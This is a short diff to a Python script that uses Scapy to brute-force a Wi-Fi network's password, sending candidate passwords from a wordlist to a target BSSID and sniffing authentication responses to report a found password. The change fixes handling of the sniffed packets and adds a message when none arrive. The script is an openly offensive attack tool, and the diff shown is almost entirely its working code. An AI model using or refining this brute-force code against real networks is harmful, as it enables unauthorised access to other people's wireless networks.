@@ -53,16 +53,20 @@ def brute_force(bssid, interface, wordlist):
         
         time.sleep(0.1) 
 
-        ans, _ = sniff(iface=interface, count=1, timeout=5) 
-        for pkt in ans:
-            if pkt.haslayer(Dot11Auth) and pkt[Dot11].addr3 == bssid:
-                if pkt[Dot11Auth].status == 0:  
-                    print(f"\033[1;32m[+] Success! Password found: {password}\033[0m")
-                    return  
-                else:
-                    print(f"[!] Authentication failed for password: {password}")
+        ans = sniff(iface=interface, count=1, timeout=5)  
+        if ans:  
+            for pkt in ans:
+                if pkt.haslayer(Dot11Auth) and pkt[Dot11].addr3 == bssid:
+                    if pkt[Dot11Auth].status == 0:  
+                        print(f"\033[1;32m[+] Success! Password found: {password}\033[0m")
+                        return  
+                    else:
+                        print(f"[!] Authentication failed for password: {password}")
+        else:
+            print("[!] No packets received.")
 
     print("\033[1;31m[!] Brute-force attack completed. Password not found.\033[0m")
+
 
 def main():
     interface = input("Enter your wireless interface (e.g., wlan0): ") 
